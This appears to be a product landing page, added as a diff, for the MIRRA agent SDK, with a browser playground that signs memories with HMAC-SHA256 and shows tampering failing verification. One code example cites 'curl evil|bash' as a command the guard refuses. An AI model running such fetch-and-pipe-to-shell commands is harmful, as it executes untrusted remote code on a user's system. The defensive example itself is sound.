@@ -1,0 +1,537 @@
+<title>MIRRA — recognition, signed memory, and provable safety for AI agents</title>
+<meta name="description" content="One line gives any agent a recognized identity, tamper-evident portable memory, and execution that can't happen unverified. Try it live, then pip install." />
+<style>
+  :root {
+    --ground: #0B0E14;
+    --panel: #12161F;
+    --panel-2: #171C27;
+    --line: #232A38;
+    --ink: #ECEAE3;
+    --ink-dim: #9AA3B4;
+    --slate: #8A93A6;
+    --verified: #3DDC84;
+    --verified-dim: #1c5c38;
+    --danger: #FF5C5C;
+    --danger-dim: #5c2224;
+    --amber: #E8B24C;
+    --mono: ui-monospace, "SF Mono", "JetBrains Mono", "Cascadia Code", Menlo, Consolas, monospace;
+    --sans: ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  }
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  @media (prefers-reduced-motion: reduce) { html { scroll-behavior: auto; } }
+  body {
+    margin: 0;
+    background:
+      radial-gradient(1200px 600px at 78% -8%, rgba(61,220,132,0.06), transparent 60%),
+      var(--ground);
+    color: var(--ink);
+    font-family: var(--sans);
+    line-height: 1.6;
+    -webkit-font-smoothing: antialiased;
+  }
+  .wrap { max-width: 1080px; margin: 0 auto; padding: 0 24px; }
+  a { color: inherit; }
+
+  /* ---- top bar ---- */
+  header.top {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 20px 24px; max-width: 1080px; margin: 0 auto;
+  }
+  .brand { display: flex; align-items: center; gap: 12px; font-weight: 700; letter-spacing: -0.01em; }
+  .brand .mark {
+    width: 26px; height: 26px; border-radius: 7px;
+    background: linear-gradient(135deg, var(--verified), #2aa866);
+    display: grid; place-items: center; color: #04120a; font-family: var(--mono);
+    font-weight: 800; font-size: 15px;
+  }
+  .brand small { color: var(--slate); font-weight: 500; font-family: var(--mono); font-size: 12px; letter-spacing: 0.02em; }
+  .top nav { display: flex; gap: 22px; align-items: center; font-size: 14px; color: var(--ink-dim); }
+  .top nav a { text-decoration: none; }
+  .top nav a:hover { color: var(--ink); }
+  .ghost-btn {
+    text-decoration: none; border: 1px solid var(--line); padding: 8px 14px; border-radius: 8px;
+    font-family: var(--mono); font-size: 13px; color: var(--ink);
+  }
+  .ghost-btn:hover { border-color: var(--verified); }
+
+  /* ---- hero ---- */
+  .hero { padding: 40px 0 8px; }
+  .eyebrow {
+    font-family: var(--mono); font-size: 12.5px; letter-spacing: 0.14em; text-transform: uppercase;
+    color: var(--verified); margin: 0 0 18px;
+  }
+  h1 {
+    font-size: clamp(34px, 5.4vw, 60px); line-height: 1.02; letter-spacing: -0.03em;
+    font-weight: 800; margin: 0 0 20px; text-wrap: balance; max-width: 16ch;
+  }
+  h1 em { font-style: normal; color: var(--verified); }
+  .lede { font-size: clamp(16px, 2vw, 19px); color: var(--ink-dim); max-width: 58ch; margin: 0 0 28px; }
+  .install {
+    display: inline-flex; align-items: center; gap: 14px; background: var(--panel);
+    border: 1px solid var(--line); border-radius: 10px; padding: 12px 14px 12px 16px;
+    font-family: var(--mono); font-size: 14.5px; flex-wrap: wrap;
+  }
+  .install .dollar { color: var(--slate); }
+  .install code { color: var(--ink); }
+  .copy {
+    border: 1px solid var(--line); background: var(--panel-2); color: var(--ink-dim);
+    font-family: var(--mono); font-size: 12px; padding: 6px 10px; border-radius: 7px; cursor: pointer;
+  }
+  .copy:hover { color: var(--verified); border-color: var(--verified); }
+
+  /* ---- terminal / playground ---- */
+  .demo { margin: 34px 0 12px; }
+  .term {
+    background: linear-gradient(180deg, var(--panel), #0e121a);
+    border: 1px solid var(--line); border-radius: 14px; overflow: hidden;
+    box-shadow: 0 30px 80px -40px rgba(0,0,0,0.9);
+  }
+  .term-bar {
+    display: flex; align-items: center; gap: 10px; padding: 12px 16px;
+    border-bottom: 1px solid var(--line); background: rgba(255,255,255,0.015);
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dot.r { background: #ff5f57; } .dot.y { background: #febc2e; } .dot.g { background: #28c840; }
+  .term-title { margin-left: 8px; font-family: var(--mono); font-size: 12.5px; color: var(--slate); }
+  .term-body {
+    display: grid; grid-template-columns: 1.15fr 1fr; min-height: 440px;
+  }
+  @media (max-width: 820px) { .term-body { grid-template-columns: 1fr; } }
+  .stage { padding: 20px; border-right: 1px solid var(--line); }
+  @media (max-width: 820px) { .stage { border-right: none; border-bottom: 1px solid var(--line); } }
+  .stage h3, .console h3 {
+    margin: 0 0 14px; font-size: 12px; letter-spacing: 0.12em; text-transform: uppercase;
+    color: var(--slate); font-weight: 700;
+  }
+
+  .people { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 16px; }
+  .person-btn {
+    font-family: var(--sans); font-size: 14px; padding: 9px 14px; border-radius: 999px;
+    border: 1px solid var(--line); background: var(--panel-2); color: var(--ink); cursor: pointer;
+    display: inline-flex; align-items: center; gap: 8px; transition: border-color .15s, background .15s;
+  }
+  .person-btn:hover { border-color: var(--verified); }
+  .person-btn .vp { font-family: var(--mono); font-size: 11px; color: var(--slate); }
+  .person-btn.active { border-color: var(--verified); background: rgba(61,220,132,0.08); }
+
+  .field { display: flex; gap: 8px; margin-bottom: 12px; }
+  .field input {
+    flex: 1; background: var(--ground); border: 1px solid var(--line); border-radius: 8px;
+    color: var(--ink); padding: 11px 12px; font-family: var(--sans); font-size: 14px;
+  }
+  .field input:focus { outline: 2px solid var(--verified); outline-offset: 1px; border-color: transparent; }
+  .act {
+    background: var(--verified); color: #04120a; border: none; border-radius: 8px; padding: 0 16px;
+    font-weight: 700; font-family: var(--sans); font-size: 14px; cursor: pointer; white-space: nowrap;
+  }
+  .act:hover { filter: brightness(1.08); }
+  .act.secondary { background: var(--panel-2); color: var(--ink); border: 1px solid var(--line); }
+  .act.secondary:hover { border-color: var(--amber); color: var(--amber); }
+  .act.danger { background: var(--panel-2); color: var(--danger); border: 1px solid var(--danger-dim); }
+  .act.danger:hover { border-color: var(--danger); }
+  .row { display: flex; gap: 8px; flex-wrap: wrap; }
+
+  .presence {
+    margin-top: 18px; padding: 14px; border: 1px solid var(--line); border-radius: 10px;
+    background: rgba(255,255,255,0.015);
+  }
+  .presence .who { display: flex; align-items: center; gap: 10px; font-weight: 700; }
+  .badge {
+    font-family: var(--mono); font-size: 11px; padding: 3px 8px; border-radius: 6px; letter-spacing: 0.03em;
+  }
+  .badge.new { color: var(--amber); border: 1px solid rgba(232,178,76,0.4); }
+  .badge.known { color: var(--verified); border: 1px solid var(--verified-dim); background: rgba(61,220,132,0.06); }
+  .presence .pid { font-family: var(--mono); font-size: 11.5px; color: var(--slate); margin-top: 6px; word-break: break-all; }
+  .memlist { margin: 12px 0 0; padding: 0; list-style: none; display: flex; flex-direction: column; gap: 7px; }
+  .memlist li {
+    font-size: 13px; color: var(--ink-dim); padding: 8px 10px; background: var(--ground);
+    border: 1px solid var(--line); border-radius: 7px; display: flex; gap: 8px; align-items: baseline;
+  }
+  .memlist li .tick { color: var(--verified); font-family: var(--mono); font-size: 12px; }
+  .memlist li.tampered { border-color: var(--danger-dim); }
+  .memlist li.tampered .tick { color: var(--danger); }
+  .memlist .empty { color: var(--slate); font-style: italic; border-style: dashed; }
+
+  /* console */
+  .console { padding: 20px; background: rgba(0,0,0,0.16); }
+  .log { font-family: var(--mono); font-size: 12.5px; line-height: 1.75; display: flex; flex-direction: column; gap: 2px; max-height: 380px; overflow-y: auto; }
+  .log .l { display: flex; gap: 8px; }
+  .log .t { color: var(--slate); user-select: none; }
+  .log .c-ink { color: var(--ink-dim); }
+  .log .c-ok { color: var(--verified); }
+  .log .c-bad { color: var(--danger); }
+  .log .c-amber { color: var(--amber); }
+  .log .c-key { color: #7fb3ff; }
+  .log .sig { color: var(--slate); word-break: break-all; }
+
+  /* ---- pillars ---- */
+  section.block { padding: 64px 0 12px; }
+  .kicker { font-family: var(--mono); font-size: 12px; letter-spacing: 0.14em; text-transform: uppercase; color: var(--slate); margin: 0 0 8px; }
+  h2 { font-size: clamp(24px, 3.4vw, 34px); letter-spacing: -0.02em; margin: 0 0 10px; text-wrap: balance; }
+  .section-lede { color: var(--ink-dim); max-width: 62ch; margin: 0 0 34px; }
+  .pillars { display: grid; grid-template-columns: repeat(2, 1fr); gap: 16px; }
+  @media (max-width: 720px) { .pillars { grid-template-columns: 1fr; } }
+  .pillar { border: 1px solid var(--line); border-radius: 12px; padding: 22px; background: var(--panel); }
+  .pillar .n { font-family: var(--mono); font-size: 12px; color: var(--verified); letter-spacing: 0.08em; }
+  .pillar h4 { margin: 10px 0 8px; font-size: 18px; letter-spacing: -0.01em; }
+  .pillar p { margin: 0; color: var(--ink-dim); font-size: 14.5px; }
+
+  /* ---- plug in ---- */
+  .paths { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
+  @media (max-width: 820px) { .paths { grid-template-columns: 1fr; } }
+  .path { border: 1px solid var(--line); border-radius: 12px; padding: 22px; background: var(--panel); display: flex; flex-direction: column; }
+  .path .tag { font-family: var(--mono); font-size: 11px; letter-spacing: 0.1em; text-transform: uppercase; color: var(--slate); }
+  .path h4 { margin: 8px 0 6px; font-size: 18px; }
+  .path p { color: var(--ink-dim); font-size: 14px; margin: 0 0 14px; flex: 1; }
+  pre {
+    margin: 0; background: var(--ground); border: 1px solid var(--line); border-radius: 9px;
+    padding: 14px; overflow-x: auto; font-family: var(--mono); font-size: 12.5px; line-height: 1.65; color: var(--ink);
+  }
+  pre .k { color: #c792ea; } pre .s { color: var(--verified); } pre .c { color: var(--slate); } pre .f { color: #7fb3ff; }
+  .frameworks { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 18px; }
+  .fw { font-family: var(--mono); font-size: 12px; color: var(--ink-dim); border: 1px solid var(--line); border-radius: 7px; padding: 6px 11px; }
+  .fw b { color: var(--verified); font-weight: 600; }
+
+  /* ---- footer ---- */
+  footer { margin-top: 72px; border-top: 1px solid var(--line); }
+  .foot { display: flex; justify-content: space-between; align-items: center; padding: 28px 0 40px; flex-wrap: wrap; gap: 16px; }
+  .foot .fl { color: var(--slate); font-size: 13px; font-family: var(--mono); }
+  .foot .fr { display: flex; gap: 18px; font-size: 14px; }
+  .foot .fr a { color: var(--ink-dim); text-decoration: none; }
+  .foot .fr a:hover { color: var(--verified); }
+  .note { color: var(--slate); font-size: 12.5px; font-family: var(--mono); margin-top: 10px; }
+</style>
+
+<header class="top">
+  <div class="brand">
+    <span class="mark">M</span>
+    <span>MIRRA <small>· agent trust layer</small></span>
+  </div>
+  <nav>
+    <a href="#how">How it works</a>
+    <a href="#plug">Plug in</a>
+    <a class="ghost-btn" href="https://github.com/Sdvegas21/mirra-sdk" target="_blank" rel="noopener">GitHub ↗</a>
+  </nav>
+</header>
+
+<main class="wrap">
+  <section class="hero">
+    <p class="eyebrow">Recognition · Signed memory · Provable safety</p>
+    <h1>Your agent, with a memory it can <em>prove</em>.</h1>
+    <p class="lede">
+      One line gives any AI agent a recognized identity, tamper-evident memory of
+      every relationship, and execution that can't happen unverified. The demo
+      below runs real cryptography in your browser — recognize a person, sign a
+      memory, then tamper one byte and watch verification fail.
+    </p>
+    <div class="install">
+      <span class="dollar">$</span><code id="installcmd">pip install mirra-sdk</code>
+      <button class="copy" id="copybtn" aria-label="Copy install command">copy</button>
+    </div>
+  </section>
+
+  <!-- ================= LIVE PLAYGROUND ================= -->
+  <section class="demo" id="playground">
+    <div class="term">
+      <div class="term-bar">
+        <span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+        <span class="term-title">mirra — live playground · real HMAC-SHA256, in your browser</span>
+      </div>
+      <div class="term-body">
+        <div class="stage">
+          <h3>Who is speaking?</h3>
+          <div class="people" id="people">
+            <button class="person-btn" data-name="Shawn" data-vp="v:1f8a…">Shawn <span class="vp">voice 1f8a</span></button>
+            <button class="person-btn" data-name="Todd" data-vp="v:9c22…">Todd <span class="vp">voice 9c22</span></button>
+            <button class="person-btn" data-name="Jill" data-vp="v:33d0…">Jill <span class="vp">voice 33d0</span></button>
+          </div>
+
+          <h3>Say something (becomes a signed memory)</h3>
+          <div class="field">
+            <input id="msg" type="text" placeholder="e.g. I have that investor call at 3" />
+            <button class="act" id="remember">Remember</button>
+          </div>
+          <div class="row">
+            <button class="act secondary" id="recall">Recall history</button>
+            <button class="act danger" id="tamper">Tamper a memory</button>
+          </div>
+
+          <div class="presence" id="presence" hidden>
+            <div class="who">
+              <span id="who-name">—</span>
+              <span class="badge" id="who-badge">—</span>
+            </div>
+            <div class="pid" id="who-pid"></div>
+            <ul class="memlist" id="memlist"></ul>
+          </div>
+        </div>
+
+        <div class="console">
+          <h3>Signed event log</h3>
+          <div class="log" id="log" aria-live="polite"></div>
+        </div>
+      </div>
+    </div>
+    <p class="note">
+      Nothing leaves your browser. Signatures use the Web Crypto HMAC-SHA256 over the
+      same canonical payload the SDK uses — a scroll signed here would verify in Python, unchanged.
+    </p>
+  </section>
+
+  <!-- ================= HOW IT WORKS ================= -->
+  <section class="block" id="how">
+    <p class="kicker">The four pillars</p>
+    <h2>One core. Everything an agent needs to be trusted.</h2>
+    <p class="section-lede">
+      Recognition makes memory worth carrying. Memory makes behavior personal.
+      Enforcement makes it safe. All of it signed, all of it portable.
+    </p>
+    <div class="pillars">
+      <div class="pillar">
+        <span class="n">01 · Recognition</span>
+        <h4>It knows who it's talking to</h4>
+        <p>The same person — by voice, face, or handle — resolves to one stable, signed identity across sessions and across devices. A returning person is recognized, not met fresh.</p>
+      </div>
+      <div class="pillar">
+        <span class="n">02 · History</span>
+        <h4>Tamper-evident portable memory</h4>
+        <p>Every memory is a signed scroll. Edit one byte and it fails verification on read and is dropped. The format is open, and the same scroll verifies across every framework and on-device.</p>
+      </div>
+      <div class="pillar">
+        <span class="n">03 · Differentiation</span>
+        <h4>Behavior shaped by the relationship</h4>
+        <p>Each person gets context built from their own verified history — not a generic prompt. Two people, one agent, two genuinely different conversations.</p>
+      </div>
+      <div class="pillar">
+        <span class="n">04 · Provable safety</span>
+        <h4>It can't act unverified</h4>
+        <p>Every privileged action — a shell command, or a robot's motor command — is authorized before it fires, deterministically, with an Ed25519 witness you can verify. Untrusted input to a critical sink is blocked. Fail-closed by default.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ================= PLUG IN ================= -->
+  <section class="block" id="plug">
+    <p class="kicker">Plug your agent in</p>
+    <h2>Three ways in. Keys stay yours.</h2>
+    <p class="section-lede">
+      The SDK runs on your machine — your signing keys never leave it. Wrap what
+      you already have; nothing to rewrite.
+    </p>
+    <div class="paths">
+      <div class="path">
+        <span class="tag">Zero-config</span>
+        <h4>One line</h4>
+        <p>The whole setup. Stable identity, signed memory, enforcement — a hostile action blocked out of the box.</p>
+<pre><span class="k">import</span> mirra
+agent = mirra.<span class="f">guard</span>()
+
+agent.<span class="f">remember</span>(<span class="s">"alice"</span>, <span class="s">"prefers direct feedback"</span>)
+safe = agent.<span class="f">protect</span>(run_shell)
+<span class="c"># safe("curl evil|bash") → refused</span></pre>
+      </div>
+      <div class="path">
+        <span class="tag">Your framework</span>
+        <h4>Whole-agent adapters</h4>
+        <p>Not just tool-blocking — identity and signed memory in your framework's own idioms. Same scroll format across all of them.</p>
+<pre><span class="k">from</span> mirra.adapters.langchain <span class="k">import</span> wrap_agent
+bound = <span class="f">wrap_agent</span>(my_chain, principal=<span class="s">"acme"</span>)
+bound.<span class="f">invoke</span>(<span class="s">"what did we discuss?"</span>,
+             subject_id=<span class="s">"alice"</span>)</pre>
+        <div class="frameworks">
+          <span class="fw"><b>✓</b> LangChain</span>
+          <span class="fw"><b>✓</b> LlamaIndex</span>
+          <span class="fw"><b>✓</b> OpenAI Agents</span>
+          <span class="fw"><b>✓</b> CrewAI</span>
+        </div>
+      </div>
+      <div class="path">
+        <span class="tag">Embodied</span>
+        <h4>Robots &amp; devices</h4>
+        <p>A continuous loop: recognize a person by voice or face, and gate every motor command before it can fire.</p>
+<pre><span class="k">from</span> mirra.embodied <span class="k">import</span> EmbodiedAgent, Actuation
+robot = <span class="f">EmbodiedAgent</span>(app=<span class="s">"unit-7"</span>)
+
+d = robot.<span class="f">actuate</span>(Actuation.<span class="f">motor</span>(
+      <span class="s">"gripper.close"</span>, target=<span class="s">"mug"</span>))
+<span class="c"># fires only if d.allowed — signed either way</span></pre>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap foot">
+    <div class="fl">Apache-2.0 · ~10k tests · verified from a clean install</div>
+    <div class="fr">
+      <a href="https://github.com/Sdvegas21/mirra-sdk" target="_blank" rel="noopener">GitHub</a>
+      <a href="https://pypi.org/project/mirra-sdk/" target="_blank" rel="noopener">PyPI</a>
+      <a href="https://github.com/Sdvegas21/mirra-core-contract/blob/main/SCROLL_FORMAT.md" target="_blank" rel="noopener">Scroll spec</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function () {
+  "use strict";
+  const enc = new TextEncoder();
+  const EXCLUDED = new Set(["qseal_signature", "qseal_verified", "qseal_meta_hash", "qseal_prev_signature"]);
+  const SECRET = "playground-demo-secret";       // demo only; real deployments use env/keystore
+  const b64 = (buf) => btoa(String.fromCharCode(...new Uint8Array(buf)));
+
+  // Canonical payload == JSON of scroll minus QSEAL fields, sorted keys, with the
+  // SAME spacing Python's json.dumps produces by default (", " and ": ") so a
+  // scroll signed here is byte-identical to one signed by the SDK.
+  function canonical(scroll) {
+    const keys = Object.keys(scroll).filter(k => !EXCLUDED.has(k)).sort();
+    const parts = keys.map(k => JSON.stringify(k) + ": " + JSON.stringify(scroll[k]));
+    return "{" + parts.join(", ") + "}";
+  }
+  async function hmacKey() {
+    return crypto.subtle.importKey("raw", enc.encode(SECRET),
+      { name: "HMAC", hash: "SHA-256" }, false, ["sign"]);
+  }
+  async function sign(scroll) {
+    const key = await hmacKey();
+    const mac = await crypto.subtle.sign("HMAC", key, enc.encode(canonical(scroll)));
+    return b64(mac);
+  }
+  async function verify(scroll) {
+    return (await sign(scroll)) === scroll.qseal_signature;
+  }
+  async function sha16(s) {
+    const d = await crypto.subtle.digest("SHA-256", enc.encode(s));
+    return [...new Uint8Array(d)].slice(0, 8).map(b => b.toString(16).padStart(2, "0")).join("");
+  }
+
+  // ---- state: people, their signed scrolls, who's present ----
+  const store = {};   // handle -> { name, personId, scrolls: [] }
+  let present = null;
+
+  const $ = (id) => document.getElementById(id);
+  const logEl = $("log");
+  let counter = 0;
+  function log(text, cls) {
+    const line = document.createElement("div");
+    line.className = "l";
+    const t = document.createElement("span"); t.className = "t";
+    t.textContent = String(++counter).padStart(2, "0");
+    const c = document.createElement("span"); c.className = cls || "c-ink"; c.textContent = text;
+    line.append(t, c); logEl.append(line); logEl.scrollTop = logEl.scrollHeight;
+  }
+  function logSig(sig) {
+    const line = document.createElement("div"); line.className = "l";
+    const t = document.createElement("span"); t.className = "t"; t.textContent = "  ";
+    const c = document.createElement("span"); c.className = "sig"; c.textContent = "hmac-sha256:" + sig.slice(0, 40) + "…";
+    line.append(t, c); logEl.append(line); logEl.scrollTop = logEl.scrollHeight;
+  }
+
+  async function selectPerson(name, vp) {
+    const handle = "voice:" + vp;
+    let entry = store[handle];
+    const known = !!entry;
+    if (!entry) {
+      entry = store[handle] = { name, personId: "person-" + await sha16(handle + name), scrolls: [] };
+    }
+    present = handle;
+    document.querySelectorAll(".person-btn").forEach(b => b.classList.toggle("active", b.dataset.name === name));
+    log((known ? "recognized " : "new voice  ") + name + "  (" + handle + ")", known ? "c-ok" : "c-amber");
+    renderPresence(known);
+  }
+
+  function renderPresence(known) {
+    const e = store[present];
+    $("presence").hidden = false;
+    $("who-name").textContent = e.name;
+    const badge = $("who-badge");
+    badge.textContent = known ? "recognized" : "new — enrolled";
+    badge.className = "badge " + (known ? "known" : "new");
+    $("who-pid").textContent = e.personId;
+    renderMems();
+  }
+
+  function renderMems() {
+    const e = store[present];
+    const list = $("memlist"); list.innerHTML = "";
+    if (!e.scrolls.length) {
+      const li = document.createElement("li"); li.className = "empty";
+      li.textContent = "no memories yet — say something above";
+      list.append(li); return;
+    }
+    e.scrolls.forEach(sc => {
+      const li = document.createElement("li");
+      if (sc._tampered) li.classList.add("tampered");
+      const tick = document.createElement("span"); tick.className = "tick";
+      tick.textContent = sc._verified ? "✓" : "✗";
+      const span = document.createElement("span"); span.textContent = sc.content;
+      li.append(tick, span); list.append(li);
+    });
+  }
+
+  async function remember() {
+    if (!present) { log("select who's speaking first", "c-amber"); return; }
+    const input = $("msg"); const text = input.value.trim();
+    if (!text) return;
+    const e = store[present];
+    const scroll = {
+      scroll_id: "MEM_" + (Date.now().toString(36)),
+      agent_id: "agent-web", subject_id: e.personId,
+      content: text, qseal_scheme: "hmac-sha256",
+      created_at: new Date().toISOString(),
+    };
+    scroll.qseal_signature = await sign(scroll);
+    scroll._verified = await verify(scroll);
+    e.scrolls.push(scroll);
+    input.value = "";
+    log("signed memory for " + e.name + ": “" + text + "”", "c-ok");
+    logSig(scroll.qseal_signature);
+    renderMems();
+  }
+
+  async function recall() {
+    if (!present) { log("select who's speaking first", "c-amber"); return; }
+    const e = store[present];
+    let ok = 0, dropped = 0;
+    for (const sc of e.scrolls) {
+      sc._verified = await verify(sc);
+      if (sc._verified) ok++; else dropped++;
+    }
+    log("recall " + e.name + " → " + ok + " verified" + (dropped ? ", " + dropped + " DROPPED (tampered)" : ""),
+        dropped ? "c-bad" : "c-ok");
+    renderMems();
+  }
+
+  async function tamper() {
+    if (!present) { log("select who's speaking first", "c-amber"); return; }
+    const e = store[present];
+    if (!e.scrolls.length) { log("nothing to tamper — write a memory first", "c-amber"); return; }
+    const target = e.scrolls[e.scrolls.length - 1];
+    const before = target.content;
+    target.content = target.content + " [edited by an attacker]";
+    target._tampered = true;
+    target._verified = await verify(target);   // will now be false
+    log("attacker edited a stored memory of " + e.name + "…", "c-amber");
+    log("verify-on-read → " + (target._verified ? "PASSED (bug!)" : "FAILED — memory rejected"),
+        target._verified ? "c-bad" : "c-bad");
+    log("the forged memory never reaches the agent. fail-closed.", "c-ok");
+    renderMems();
+    target._restore = before;
+  }
+
+  // ---- wire up ----
+  document.querySelectorAll(".person-btn").forEach(btn => {
+    btn.addEventListener("click", () => selectPerson(btn.dataset.name, btn.dataset.vp.replace("v:", "").replace("…", "")));
+  });
+  $("remember").addEventListener("click", remember);
+  $("msg").addEventListener("keydown", (e) => { if (e.key === "Enter") remember(); });
+  $("recall").addEventListener("click", recall);
+  $("tamper").addEventListener("click", tamper);
+  $("copybtn").addEventListener("click", async () => {
+    try { await navigator.clipboard.writeText("pip install mirra-sdk"); $("copybtn").textContent = "copied"; setTimeout(() => $("copybtn").textContent = "copy", 1200); } catch (e) {}
+  });
+
+  log("playground ready — real HMAC-SHA256, nothing leaves this page", "c-key");
+  log("try: click Shawn, remember something, click Shawn again → recognized", "c-ink");
+})();
+</script>
